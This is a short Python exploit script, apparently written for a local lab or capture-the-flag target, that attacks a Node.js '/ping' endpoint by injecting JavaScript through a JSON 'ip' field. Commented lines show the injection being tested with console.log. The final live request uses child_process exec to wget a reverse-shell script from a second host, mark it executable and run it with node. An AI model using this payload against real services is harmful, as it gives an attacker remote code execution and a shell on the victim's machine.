#!/usr/bin/python3

import requests
import urllib3
import logging
import sys
from time import sleep

logging.basicConfig(level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
http_proxy = "http://127.0.0.1:8080"
proxyDict = {"http":http_proxy}

# 1. Establish Session
logging.info('1. Establishing Session')

session = requests.Session()

# 2. Send a Test HTTP Request to web root.
response = requests.get('http://127.0.0.1:21440/')

if int(response.status_code) == 200:
    logging.info("2. Web root accessible.\n")
else:
    logging.info("2. Web adddress not accessible.\n")
    print(str(response.status_code) + "\n")
    sys.exit("...Exiting")

# 3. Send an HTTP POST Request to / with a test command.
logging.info("3. Sent POST request.")
#payload = '{"debug": "true", "ip": "{"ip": "8.8.8.8"}"}'
#response = requests.post('http://127.0.0.1:21440/ping', json={"debug": "true", "ip": '{"ip": "8.8.8.8"}'})

#response = requests.post('http://127.0.0.1:21440/ping', json={"debug": "true", "ip": '{"ip": "1\"}\'); console.log(\'hurray\');//"}'})

response = requests.post('http://127.0.0.1:21440/ping', json={"debug": "true", "ip": '{"ip": "1\"}\'); const { exec } = require(\"child_process\"); exec(\"wget http://127.0.0.1:9001/reverse_5000.js; chmod 755 reverse_5000.js; node reverse_5000.js;\");//"}'})

print(response.content)
